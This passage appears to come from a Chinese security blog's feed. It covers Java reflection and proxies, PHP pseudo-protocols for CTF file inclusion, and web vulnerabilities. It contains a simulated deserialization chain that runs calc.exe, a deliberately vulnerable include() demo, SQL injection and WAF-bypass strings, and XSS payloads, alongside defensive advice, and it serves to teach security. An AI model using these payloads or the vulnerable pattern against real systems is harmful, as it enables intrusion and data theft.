小结可以将InvocationHandler接口类看做一个中介类，中介类持有一个被代理对象即真实对象，在invoke()方法中调用了被代理对象相应的方法。通过聚合方式持有被代理对象的引用，把外部对invoke的调用最终都转为对被代理对象的调用。 代理类调用自己方法时，通过自身持有的中介类对象来调用中介类对象的invoke方法，从而达到代理执行被代理对象的方法。也就是说，动态代理通过中介类实现了具体的代理功能。 参考java动态代理实现与原理详细分析 java的动态代理机制详解 Java动态代理与反射详解]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java反射机制]]></title>
    <url>%2F2019%2F02%2F01%2FJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[基本概念反射机制定义：Java反射机制是在运行状态时，对于任意一个类，都能够获取到这个类的所有属性和方法，对于任意一个对象，都能够调用它的任意一个方法和属性(包括私有的方法和属性)，这种动态获取的信息以及动态调用对象的方法的功能就称为java语言的反射机制。 通俗点讲，通过反射，该类对我们来说是完全透明的，想要获取任何东西都可以。 要使用反射机制，就必须要先获取到该类的字节码文件对象(.class)，通过字节码文件对象，就能够通过该类中的方法获取到我们想要的所有信息(方法，属性，类名，父类名，实现的所有接口等等)，每一个类对应着一个字节码文件也就对应着一个Class类型的对象，也就是字节码文件对象。 反射机制相关类库在Java中，Class类和java.lang.reflect类库一起构成了对反射机制的支持。其中最常使用到的类是Constructor，Field，Method，而这三个类都继承了一个接口java.lang.reflect.Member。下面列举介绍一下java.lang.reflect类库中的类： AccessibleObject：Field，Method，和Constructor对象的基类。提供了将反射的对象标记为在使用时取消默认Java语言访问控制检查的能力。 Array：提供了动态创建和访问Java数组的方法。 Constructor：提供关于类的单个构造方法的信息以及对它的访问权限。 Field： 提供有关类或接口的单个字段的信息，以及对它的动态访问权限。反射的字段可能是一个类（静态）字段或实例字段。 Method： 提供关于类或接口上单独某个方法（以及如何访问该方法）的信息。所反映的方法可能是类方法或实例方法（包括抽象方法）。 Modifier： 类提供了 static 方法和常量，对类和成员访问修饰符进行解码。修饰符集被表示为整数，用不同的位位置 (bit position) 表示不同的修饰符。该类的字段均是int类型的变量。 Proxy： 提供用于创建动态代理类和实例的静态方法，它还是由这些方法创建的所有动态代理类的超类。 ReflectPermission：反射操作的 Permission 类。ReflectPermission 是一种指定权限，没有动作。当前定义的唯一名称是 suppressAccessChecks，它允许取消由反射对象在其使用点上执行的标准 Java 语言访问检查 - 对于 public、default（包）访问、protected、private 成员。 当要使用反射机制去探查一个类的内部时，还可以调用getFields()，getMethods()和getConstructors()等很便利的方法。对于反射机制，和RTTI（Run-Time Type Information，运行时类型信息）的区别就在于，RTTI是在编译时打开和检查.class文件，而反射机制是在运行时打开和检查.class文件。 获取类名称通过反射机制获取类名称有三种方法： 1、Class clz = Class.forName(“com.test.User”); 2、Class clz = com.test.User.class; 3、User u = new User(); Class clz = u.getClass(); Demo示例： 123456789101112131415161718192021public class test &#123; public static void main(String[] args) &#123; try &#123; Class clz1 = Class.forName("java.lang.Runtime"); System.out.println("方法一："); System.out.println(clz1.getName()); &#125; catch (ClassNotFoundException e) &#123; System.out.println("forName出错"); &#125; Class clz2 = java.lang.ProcessBuilder.class; System.out.println("方法二："); System.out.println(clz2.getName()); java.lang.String s = ""; Class clz3 = s.getClass(); System.out.println("方法三："); System.out.println(clz3.getName()); &#125;&#125; 可从运行结果中看到分别获取了不同类名称： 创建对象通过Class创建对象： Class clz = Class.forName(“com.test.User”); User u = (User)clz.newInstane();//调用无参构造函数 Demo示例： Uset.class定义User类，包含用户名和年龄： 12345678910111213141516171819202122232425262728public class User &#123; private String name; private int age; @Override public String toString() &#123; return "User&#123;" + "name='" + name + '\'' + ", age=" + age + '&#125;'; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public void setAge(int age) &#123; this.age = age; &#125; public int getAge() &#123; return age; &#125;&#125; test.class中调用newInstane()创建对象： 123456789101112131415161718public class test &#123; public static void main(String[] args) &#123; Class clz = User.class; User user = null; try &#123; user = (User)clz.newInstance(); &#125; catch (InstantiationException e)&#123; e.printStackTrace(); &#125; catch (IllegalAccessException e)&#123; e.printStackTrace(); &#125; user.setName("Mi1k7ea"); user.setAge(6); System.out.println(user); &#125;&#125; 从结果可看到创建了新的User类对象并成功赋值： 获取类对象属性这里的属性指的是类定义的组成元素，如修饰符、方法名、成员变量等。 获取所有的属性： Class clz = Class.forName(“com.test.User”); Field [] fields = clz.getDeclaredFields(); 获取特定属性： Class clz = Class.forName(“com.test.User”); Field [] fields = clz.getDeclaredField(“xxx”);//xxx为指定属性名 Demo示例： 1234567891011121314151617181920212223242526272829import java.lang.reflect.Field;public class test &#123; public static void main(String[] args) &#123; try &#123; Class clz = Class.forName("User"); User user = (User)clz.newInstance(); Field[] fields = clz.getDeclaredFields(); System.out.println("User类所有的属性："); for (Field f : fields) &#123; System.out.println(f); &#125; Field field = clz.getDeclaredField("name"); field.setAccessible(true); field.set(user, "Mi1k7ea"); System.out.println("\n修改的User类对象的name值为："); System.out.println(field.get(user)); System.out.println("修改属性后的User类对象："); System.out.println(user); &#125; catch (ClassNotFoundException e) &#123; System.out.println("forName出错"); &#125; catch (Exception e)&#123; e.printStackTrace(); &#125; &#125;&#125; 可从结果看到调用获取了getDeclaredFields()所有Runtime类的属性，包括修饰符、方法名、成员变量等，同时也调用getDeclaredField()获取了指定的属性： 应用示例1、利用反射，在泛型为int的arryaList集合中存放一个String类型的对象原理：集合中的泛型只在编译器有效，而到了运行期时泛型则会失效。 1234567891011121314151617import java.lang.reflect.Method;import java.util.ArrayList;import java.util.List;public class test &#123; public static void main(String[] args) throws Exception&#123; List&lt;Integer&gt; list = new ArrayList&lt;Integer&gt;(); list.add(1); list.add(2);// list.add("Mi1k7ea");//在编译器中泛型生效，插入字符串对象会报错 Class clz = list.getClass(); Method method = clz.getMethod("add", Object.class); method.invoke(list, "Mi1k7ea"); System.out.println(list); &#125;&#125; 可以看到成功将String类型对象放入泛型为int型的数组中： 2、利用反射，简化编写Servlet的个数利用反射机制，在为程序添加新功能时可以无需逐个对应编写新的Servlet，提高开发效率和代码简洁性。主要有如下两个方式优化。 （1）、通过编写利用反射机制获取指定属性值的Servlet的方式 每次从页面传过来一个参数，method=”xxx”; 然后编写一个Servlet，获得其参数method的值，进行判断，如果是add，则调用add方法，如果是delete，则调用delete方法，这样就可以写在一个servlet中实现所有的功能了。 （2）、通过Servlet的生命周期即service()实现反射机制来实现 编写一个通用的BaseServlet，继承于HttpServlet： 编写具体实现的方法Servlet类MyServlet001，继承于BaseServlet： 由Servlet的生命周期可知，在访问该Servlet时会调用service()方法，然而MyServlet001类中并无service()，因此会返回到父类BaseServlet中找到该service()方法，再获取参数从而知道需要调用的方法，因为方法的编写都在子类中，所以通过反射，获取到子类中对应的方法并运行，其中需要注意的是this这个参数在BaseServlet中的用法。 3、利用反射，构造链式结构的反序列化漏洞利用payload在经典的Apache Commons Collections反序列化漏洞中，其payload的构造正是利用了反射机制来实现链式结构，将要执行的恶意代码构造成一条反射链，再通过包含自定义readObject()方法的类来触发执行。 这里简单模拟一下该反序列化漏洞场景，代码示例如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101import java.io.*;public class ReflectionPlay implements Serializable &#123; public static void main(String[] args) throws Exception &#123; ReflectionPlay rp = new ReflectionPlay(); rp.deserialize(rp.serialize(rp.getObject())); &#125; //构造链式结构的ReflectionChains类对象并复制到ReadObject类对象中，返回该恶意对象 public Object getObject() &#123; String command = "calc.exe"; Object firstObject = Runtime.class; ReflectionObject[] reflectionChains = &#123; //调用Runtime.class的getMethod方法，寻找getRuntime方法，得到一个Method对象(getRuntime方法) //等同于Runtime.class.getMethod("getRuntime",new Class[]&#123;String.class,Class[].class&#125;) new ReflectionObject("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;), //调用Method的invoker方法可以得到一个Runtime对象，等同于method.invoke(null)，静态方法不用传入对象 new ReflectionObject("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;), //调用RunTime对象的exec方法，并将command作为参数执行命令 new ReflectionObject("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;command&#125;) &#125;; return new ReadObject(new ReflectionChains(firstObject, reflectionChains)); &#125; //序列化对象到byte数组 public byte[] serialize(final Object obj) throws IOException &#123; ByteArrayOutputStream out = new ByteArrayOutputStream(); ObjectOutputStream objOut = new ObjectOutputStream(out); objOut.writeObject(obj); return out.toByteArray(); &#125; //从byte数组中反序列化对象 public Object deserialize(final byte[] serialized) throws IOException, ClassNotFoundException &#123; ByteArrayInputStream in = new ByteArrayInputStream(serialized); ObjectInputStream objIn = new ObjectInputStream(in); return objIn.readObject(); &#125; //定义一个有漏洞的类，主要提供的功能是根据自己属性中的值来进行反射调用 class ReflectionObject implements Serializable&#123; private String methodName; private Class[] paramTypes; private Object[] args; public ReflectionObject(String methodName, Class[] paramTypes, Object[] args) &#123; this.methodName = methodName; this.paramTypes = paramTypes; this.args = args; &#125; //根据methodName、paramTypes来寻找对象的方法，利用args作为参数进行调用 public Object transform(Object input) throws Exception &#123; Class inputClass = input.getClass(); return inputClass.getMethod(methodName, paramTypes).invoke(input, args); &#125; &#125; //定义一个反射链的类 class ReflectionChains implements Serializable&#123; private Object firstObject; private ReflectionObject[] reflectionObjects; public ReflectionChains(Object firstObject, ReflectionObject[] reflectionObjects) &#123; this.firstObject = firstObject; this.reflectionObjects = reflectionObjects; &#125; //遍历ReflectionObject类对象数组并调用其transform()方法 public Object execute() throws Exception &#123; Object concurrentObject = firstObject; for (ReflectionObject reflectionObject : reflectionObjects) &#123; concurrentObject = reflectionObject.transform(concurrentObject); &#125; return concurrentObject; &#125; &#125; //定义一个用于序列化与反序列化的类,拥有一个属性和一个重写了的readObject()方法，并且在readObject()方法中执行了该属性的一个方法 //当反序列化该类对象时会执行自定义的readObject()方法 class ReadObject implements Serializable &#123; private ReflectionChains reflectionChains; public ReadObject(ReflectionChains reflectionChains) &#123; this.reflectionChains = reflectionChains; &#125; //自定义readObject()，当反序列化的时候，这个代码会被调用，且被调用的时候其属性都是空 private void readObject(java.io.ObjectInputStream stream) throws IOException, ClassNotFoundException &#123; try &#123; //用来模拟当readObject()的时候，对自身的属性进行了一些额外的操作，以符合反序列化漏洞特征 reflectionChains= (ReflectionChains) stream.readFields().get("reflectionChains",null); reflectionChains.execute(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125; 运行后弹出计算器，即利用了反射机制实现系统命令执行： 参考Java中反射机制详解 Java反射机制Reflection]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP伪协议]]></title>
    <url>%2F2019%2F01%2F31%2FPHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%2F</url>
    <content type="text"><![CDATA[基本概念PHP伪协议在CTF中经常使用到，这里写个简单的Demo小结一下，主要对file://、php://filter、php://input、data://、zip://、compress.bzip2://、compress.zlib://、phar://等协议进行简单的Demo介绍分析。 简单说一下，file://用于访问本地文件系统读取本地文件；php://访问各个输入/输出流（I/O streams），其中php://filter用于读取文件内容，php://input可以访问请求的原始数据的只读流、同时可将post请求中的数据作为PHP代码执行；zip://，bzip2://，zlib://均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名；data://即写入数据；phar://即PHP归档。 简单文件包含Demo代码demo.php 1234567&lt;?php echo '&lt;h3&gt;Hi, just a test for php pseudo protocol. :)&lt;/h3&gt;'; echo '&lt;p&gt;u can input a param called "file" by GET method.&lt;/p&gt;'; if(isset($_GET["file"]))&#123; @include($_GET["file"]); &#125;?&gt; 正常访问，提示可以通过GET传入一个file参数包含文件： file://协议file://协议用于访问本地文件系统，在CTF中通常用来读取本地文件且不受allow_url_fopen与allow_url_include的影响。 注意：该协议的路径只能输入绝对路径，输入相对路径是不生效的。 先输入一个文本文件，可以读到该文件内容，比如CTF经常遇到的flag： 输入php或JS文件，file://协议会执行该PHP文件里的代码而不是显示该内容，因而该协议不适用于获取文件内容源代码（而常用php://filter伪协议）： php://协议php://访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。 不需要开启allow_url_fopen，仅php://input、php://stdin、 php://memory和php://temp需要开启allow_url_include。 php://filter协议php://filter是一种元封装器，设计用于数据流打开时的筛选过滤应用。在CTF中主要用于读取文件内容。不需要开启allow_url_fopen和allow_url_include。 查看之前的test.js文件与PHP文件： php://input协议php://input可以访问请求的原始数据的只读流，在CTF中多用于执行php代码。 不需要开启allow_url_fopen和allow_url_include。 data://协议data://即数据，在CTF中主要用于写入代码并包含该代码到当前页面中。 必须同时开启allow_url_fopen和allow_url_include。 使用形式如下： 1234data:text/plain;base64, &lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;data://text/plain;base64, &lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;data:text/plain;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=data://text/plain;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4= zip://、bzip2://、zlib://协议zip://、bzip2://、zlib://均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。 不需要开启allow_url_fopen和allow_url_include。 zip://协议zip://压缩流，不需要开启allow_url_fopen和allow_url_include。 使用方法： zip:// [压缩文件绝对路径]#[压缩文件内的子文件名] 文件路径必须为绝对路径。 上传一个包含PHP代码文件的zip包，只要zip://访问该协议即触发文件包含漏洞、将任意文本文件中的内容当作PHP代码执行： 当然可以修改上传的zip文件后缀名为其他如图片后缀，根据特定情况可绕过一些上传文件类型的限制： zlib://协议zlib://压缩流，不需要开启allow_url_fopen和allow_url_include。 使用方法： compress.zlib://file 文件无绝对路径限制。 bzip2://协议bzip2://压缩流，不需要开启allow_url_fopen和allow_url_include。 使用方法： compress.bzip2://file 文件无绝对路径限制。 可是这里怎么测试都不成功，通过phpinfo查看bzip2://是enable且文件类型和文件路径都进行尝试，PHP版本也换了几个，还是无法显示phpinfo信息，哪位知道原因的大佬请指点一下 : ) phar://协议phar://即PHP归档，常用于解析phar文件内容，最近的CTF中多用于phar反序列化漏洞利用。反序列化漏洞具体的利用可参考phar反序列化漏洞。]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见Web漏洞类型总结]]></title>
    <url>%2F2019%2F01%2F30%2F%E5%B8%B8%E8%A7%81Web%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[这里小结一下常见的Web漏洞类型，待完善。 SQL注入与SQL盲注一、基本概念漏洞定义 SQL注入漏洞作为OWASP TOP10中重要的一部分，可见其安全性的危害有多大。简单地说，SQL注入就是通过构建特殊的具有SQL语法的语句，绕到数据库中进而执行相应的操作的漏洞。攻击者利用这个问题，可以访问或修改数据，或者利用潜在的数据库漏洞进行攻击。 成因 针对SQL注入的攻击行为可描述为通过在用户可控参数中注入SQL语法，破坏原有SQL结构，达到编写程序时意料之外结果的攻击行为。其成因可以归结为以下两个原因叠加造成的： 程序编写者在处理应用程序和数据库交互时，使用字符串拼接的方式构造SQL语句 未对用户可控参数进行足够的过滤便将参数内容拼接进入到SQL语句中 攻击方式 SQL注入的攻击方式根据应用程序处理数据库返回内容的不同，可以分为基于报错的注入、基于布尔的注入和盲注。 ​ 基于报错的注入：数据库查询返回结果并没有在页面中显示，但是应用程序将数据库报错信息打印到了页面中，所以攻击者可以构造数据库报错语句，从报错信息中获取想要获得的内容，如注入各种符号以及组合： ‘ “ ( % ​ 基于布尔的注入：攻击者可以直接在当前界面内容中获取想要获得的内容，如注入：1’ and ‘1’=’1和1’ and ‘1’=’2 相当于 1’ and ‘1和1’ and ‘0，当返回的结果不同时即有漏洞 盲注：数据库查询结果无法从直观页面中获取，攻击者通过使用数据库逻辑或使数据库库执行延时等方法获取想要获得的内容 ​ 判断盲注的常见用法： 121’ and 1=1 #1’ and 1=2 # ​ 判断这两种不同的输入是否有不一样的显示，如果一个正常一个通用的错误提示或者啥也不显示，则几乎可以确定是含有SQL注入漏洞的。 ​ 基于布尔的注入代码示例： 1http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and 1=1 --+ ​ 基于报错的注入代码示例： 1http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and 1=0 union select 1,count(*),concat((select email_id from emails where id=5),0x2a,floor(rand(0)*2))x from users group by x--+ ​ 盲注代码示例： 1http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and (select substr(email_id,1,1) from emails where id=3) &gt; 'a' --+ 几个常用的函数 ​ user()返回当前数据库连接使用的用户； ​ database()返回当前数据库连接使用的数据库； ​ version()返回当前数据库的版本； ​ concat或者concat-ws函数可以将这些函数进行组合使用并显示出来。concat函数中，将其中的参数直接连接起来产生新的字符串。而在concat_ws函数中，第一个参数是用于作为分隔符将后面各个参数的内容分隔开来再进行相应的连接产生新的字符串。以其常用的例子为例： 1concat_ws(char(32,58,32),user(),database(),version()) ​ 其中char()函数为将里面的参数转化为相应的字符，其中32为空格，58为冒号(:)，通过这样的方式可以绕过一些简单的过滤机制。 几个常用的全局函数 ​ @@datadir @@hostname @@VERSION @@version_compile_os 危害 攻击者利用SQL注入漏洞，可以获取数据库中的多种信息（例如：管理员后台密码），从而脱取数据库中内容（脱库）。在特别情况下还可以修改数据库内容或者插入内容到数据库，如果数据库权限分配存在问题，或者数据库本身存在缺陷，那么攻击者可以通过SQL注入漏洞直接获取webshell或者服务器系统权限。 二、绕过WAF的方法1、大小写绕过 ​ 如：?id=1’ uNiOn SElecT * FrOm users # 2、简单编码绕过 ​ 如URL编码、双重URL编码、Hex编码、Unicode编码等。 ​ ?id=1%252f%252a*/UNION%252f%252a /SELECT ​ id=-15 /!u%6eion/ /!se%6cect/ 1,2,3,4… ​ ?id=10%D6‘%20AND%201=2%23 ​ SELECT ‘Ä’=’A’; #1 3、注释绕过 ​ 如?id=1 uni//on sele//ct 1,2,3 # 4、分隔重写绕过 ​ 适用于WAF采用正则表达式检测所有的敏感字的情况，可以通过注释分开敏感字，如?id=1 un//ion sel//ect 1,2,3 #；至于重写绕过，适用于WAF过滤了一次的情况，如uniunionon，有时候可能还有多次过滤的情况，这时多次尝试也可以。 5、HTTP参数污染(HPP)： ​ 如?id=1 union select 1,2,3 from users where id=1 # ​ 这时可以改为 ?id=1 union select 1&amp;id=2,3 from users where id=1 # ​ 次数&amp;id=会在查询时变成逗号，具体细节取决于 WAF ； ​ 这个例子也同理：?id=1//union/&amp;id=/select/&amp;id=/pwd/&amp;id=/from/&amp;id=/users # ​ 如果服务器代码为： select from table where a=”.$_GET[‘a’].” and b=”.$_GET[‘b’].” limit “.$_GET[‘c’]; 那么可以构造这样的注入语句： ?a=1 union/&amp;b=/select 1,pass/&amp;c=/from users # 最终解析为： select from table where a=1 union/ and b=/select 1,pass/limit /from users # 可以看到，这种方式比较适合白盒测试。 6、使用逻辑运算符 or /and 绕过 ​ 如?id=1 or 0x50=0x50 ​ ?id=1 and ascii(lower(mid((select pwd from users limit 1,1),1,1)))=74，其中select pwd from users limit 1,1是从 users 表里查询 pwd 字段的第一条记录， 然后 mid()就是取该记录的第一个字符， lower()把字符转换为小写， ascii 把 该字符转换成 ascii 码，最后判断等不等于 74。 7、比较操作符替换 ​ 比较操作符如!=、&lt;&gt;、&lt;、&gt;都可以用来替换=来绕过。 8、同功能函数替换 ​ substring()可以用mid()、substr()这些函数来替换，都是用来取字符串的某一位字符的； ​ ascii()编码可以用 hex()、bin()，即十六进制和二进制编码替换； ​ 在使用在基于延时的盲注中benchmark()和sleep()可以相互替换； ​ group_concat 、 concat 、concat_ws 三者可以互相替换； ​ 还有一种新的方法 ，3条语句分别如下 123substring((select ‘password’),1,1) = 0x70substr((select ‘password’),1,1) = 0x70mid((select ‘password’),1,1) = 0x70 ​ 都是从 password 里判断第一个字符的值，可以用 123strcmp(left(‘password’,1), 0x69) = 1strcmp(left(‘password’,1), 0x70) = 0strcmp(left(‘password’,1), 0x71) = -1 ​ 替换，left 用来取字符串左起 1 位的值，strcmp 用来比较两个值，如果比较结果相等就为 0，左边小的话就为-1，否则为 1。 9、盲注无需or和and ​ 例句：index.php?id=1 ​ 当and和or被过滤时，可以将 1修改为是通过语句生成的， 1index.php?uid=strcmp(left((select+hash+from+users+limit+0,1),1),0x42)+123 123 的时候页面是正确的，现在再盲猜 hash 的第一位，如果第一位等于 0x42 也就是 B，那么strcmp结果为0，0+123=123，所以页面应该是正确的。否则就说明不是 B，就这样猜，不用 and 和 or 了。 10、加括号 123?id=(1)union(select(1),mid(hash,1,32)from(users)) ?id=(1)union(((((((select(1),hex(hash)from(users))))))))?id=(1)or(0x50=0x50) 11、缓冲区溢出绕过 ​ 如 1id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10 # ​ 其中 A 越多越好，一般要求 1000 个以上。 三、检测方法1、基于报错的检测方法 使用各种符号以及组合： ‘ “ ( % 如直接在URL后添加单引号看是否报错index.php?id=1’ 2、基于布尔的检测 最常用的如1’ and ‘1’=’1和1’ and ‘1’=’2 相当于 1’ and ‘1和1’ and ‘0 当返回的结果不同时即有漏洞 3、直接在URL地址后面加-1、-0、’%2B’和’%2B’a 添加-1：index.php?id=123-1，当前后访问的页面不同时，即可确定存在数字型SQL注入漏洞； 添加-0：index.php?id=123-0，当前后访问的页面相同时，再加上-1，返回错误页面，则表示存在数字型SQL注入漏洞； 添加’%2B’和’%2B’a：这里%2B为‘+’的URL编码，当先添加’%2B’时index.php?id=123’%2B’返回同样的页面，而添加’%2B’a时返回错误，这种适用于SQL语句中id值被一对单引号括起来的情况。 4、判断盲注的常用方法 1’ and 1=1 # 1’ and 1=2 # 判断这两种不同的输入是否有不一样的显示，如果一个正常一个通用的错误提示或者啥也不显示，则几乎可以确定是含有SQL注入漏洞的。 四、防御方法关键是对所有用户的输入进行严格的检查过滤、对数据库配置使用最小权限原则。 常用的修复方案 （1）所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中。 （2）过滤危险的 SQL 语句关键字。 （3）确认每种数据的类型。 （4）数据长度应该严格规定。 （5）网站每个数据层的编码统一。 （6）严格限制网站用户的数据库的操作权限。 （7）避免网站显示 SQL 错误信息。 （8）在网站发布之前建议使用一些专业的 SQL 注入检测工具进行检测。 （9）升级 web 服务器运行平台软件补丁，建议使用 WAF 防护。 其实最有效的防御手段是下面两种： 1、预编译 原理是采用PreparedStatement将相应的SQL语句预先编译好，即SQL引擎会预先进行语法分析，产生语法树，生成执行计划，从而无论用户输入什么内容即使是sql命令都不会影响该SQL语句的语法结构而只能当成是字符串字面值参数。但并不是所有场景都能采用SQL预编译的，如需要进行一些字符串拼接的方式，这时便需要严格检查参数的数据类型以及采用一些安全函数来处理。 其过程如下: （1）定义预编译的sql语句，其中待填入的参数用?占位。 （2）创建预编译Statement，并把sql语句传入。此时sql语句已与此preparedStatement绑定。所以第4步执行语句时无需再把sql语句作为参数传入execute()。 （3）填入具体参数。通过setXX(问号下标，数值）来为sql语句填入具体数据。问号下标从1开始，setXX与数值类型有关，字符串就是setString（index，str）。 （4）执行预处理对象。 例子： 1234String sql=&quot;select id,no from user where id=?&quot;;PreparedStatement ps = conn.prepareStatement(sql);prestmt.setInt(1,id);prestmt.executeQuery(); 2、变量绑定 是指在sql语句的条件中使用变量而不是常量，是为了减少解析的。具体的细节网上很多，后面再补充。 XSS（跨站脚本）一、基本概念漏洞定义 跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。 ​ XSS，全称cross-site scripting，是用于攻击Web客户端而不是服务器端，其最大的特点是能把恶意的JS或HTML代码注入到用户浏览的网页上。而XSS漏洞的存在，主要是由于Web应用程序对用户的输入没有进行严格的过滤所导致的，当攻击者把恶意代码注入到网页时，用户只要访问该网页就会执行其中的恶意代码。 成因 造成XSS漏洞的原因就是，攻击者的输入没有经过严格的控制，最终显示给来访的用户，攻击者通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java,VBScript， ActiveX， Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、个人网页内容、会话和cookie等各种内容。 类型 主要分为以下前3种。 ​ 反射型（非持久）：主要用于将恶意代码附加到URL地址的参数中，常用于窃取客户端cookie信息和钓鱼欺骗。 ​ 存储型（持久型）：攻击者将恶意代码注入到Web服务器中并保存起来，只要客户端访问了相应的页面就会受到攻击。 ​ DOM型：利用浏览器的DOM特性，不是向浏览器发请求而是直接通过在本地执行从而修改或窃取本地的信息。 ​ Flash型：利用网页上flash文件的缺陷来执行js脚本，一般是反射型XSS。​ mXSS型：又被叫做突变XSS，主要被用于绕过XSS过滤。用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得一串看似没有任何危害的HTML代码，最终将进入某个DOM节点的innerHTML中，浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。随后，该段攻击代码可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 使用场景 ​ 直接嵌入html script标签中 ​ 元素标签事件 1&lt;body onload=alert(‘xss’)&gt; ​ 图片标签 img ​ 框架标签 iframe ​ DOM对象 利用方式 ​ 窃取用户cookie来非法登录访问目标站点； XSS与CSRF漏洞结合利用，使受害者在不知不觉中用用户的账号进行转账等敏感危险操作； ​ XSS蠕虫； ​ 执行恶意JS代码实现键盘记录； ​ 内嵌恶意HTML代码到页面中； ​ 页面恶意重定向； ​ 利用XSS进行DDOS，参考：SOHU视频XSS漏洞导致其用户成为DDOS肉鸡。 二、绕过WAF的方法利用&lt;&gt;标记注入HTML或JS 1&lt;script&gt;alert(‘xss’)&lt;/script&gt; 利用HTML标签属性值执行XSS 很多的HTML标记中的属性都支持javascript:[code]伪协议的形式 1&lt;img src=”javascript:alert('xss');”&gt; 空格回车TAB 空白不会影响JS语句的在正常执行 1&lt;img src=”javas cript:alert('xss')” width=100&gt; 对标签属性值进行转码 HTML属性值本身是支持ASCII码形式的 1&lt;img src=”javascript:alert('xss')” width=100&gt; ​ 其中t的ASCII码值为116，用“&amp;#116”来表示，而冒号:的ASCII值为58。 ​ 另外，Tab符的ASCII码为&amp;#9、换行符的为&amp;#10、回车符的为&amp;#13可以被插入到代码的任何地方中去。 ​ 还可以将&amp;#01、&amp;#02等字符插入到JavaScript的头部中。 产生自己的事件 ​ 事件是用户或浏览器自身执行的某个动作，如Click等 1&lt;img src=http://10.10.10.137/alan.jpg onerror=alert('xss')&gt; ​ onerror是img标签的一个事件，只要页面发生错误就会激活相应的事件。 ​ 除此之外还有各种事件，如：onResume、onfinish、onstop、onReverse等等。 利用CSS跨站剖析 ​ CSS是XSS的另一个载体，代码通常是嵌入到style标签/属性中的。 ​ 缺点是个浏览器之间不能通用。 扰乱过滤规则 转换大小写，顺序可以随意 双引号与单引号互换 不使用引号 注释符号 内嵌 字符编码 可以对代码进行十进制编码（&amp;#），可以在每个十进制字符后面加上分号；，也可以采用&amp;#0、&amp;#00；等的形式。 ​ JS中的eval()函数，用于计算字符串并执行其中的JS代码。可以使用\连接十六进制字符串形式的脚本让eval()函数来执行，如 1&lt;script&gt;eval(“\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29”);&lt;/script&gt; ​ 也可以让其执行十进制形式的脚本，但需要和String.fromCharCode()函数一起使用、实现将字符转为ASCII值，如 1&lt;img src="javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))"&gt; ​ 在利用CSS中，可以对style中的属性进行十六进制的编码来绕过。 Shellcode的调用 ​ 简单地说，Shellcode是指对一个漏洞进行利用的代码。 动态调用远程JS 将shellcode保存在其他服务器中，然后再用script标签来动态加载。除此之外，还可以通过基于DOM的方法创建和插入结点，把代码注入到网页中。这两种方式在利用中都有相应的演示。 使用window.location.hash ​ 即DOM型。location是JS管理地址栏的内置对象，location.hash则是用来获取或设置页面的标签值。相关的简单的利用已有示例，至于DOM型的XSS会有进一步的笔记。 三、检测方法​ 寻找脚本程序的输出显示代码，搜索关键字，显示输出那个变量，跟踪变量是否被过滤。 ​ 可以先输入一些内容，页面返回之后，可以查看网页源代码，搜索内容关键字看看是不是直接返回在页面的HTML代码中。 四、防御方法1、调用函数 ​ 对于用户提交的数据可以通过调用函数进行过滤，htmlspecialchars()函数将输出的内容进行HTML的编码，效果最好；str_replace()函数可以将指定的字符串转换为其他字符串的，但是会被绕过。 2、使用XSS Filter （1）输入过滤 ​ 输入验证（客户端）：前端JS过滤，如检测最大长度、是否只有合法字符、格式是否符合要求、数字是否在指定的范围内。缺点就是容易被修改掉。 ​ 数据消毒（服务器端）：过滤敏感字符（可以和SQL注入的一同过滤），如&lt; &gt; javascript ‘ “ &amp; # expression等。 （2） 输出编码（服务器端） ​ 可以使用HTML编码（PHP的htmlspecialchars()函数、ASP的Server.HTMLEncode()函数、ASP.NET的Server.HtmlEncode()函数），用对应的HTML实体替代字面量字符，此时浏览器会将恶意代码当作HTML文档的内容而不是结构加以处理。 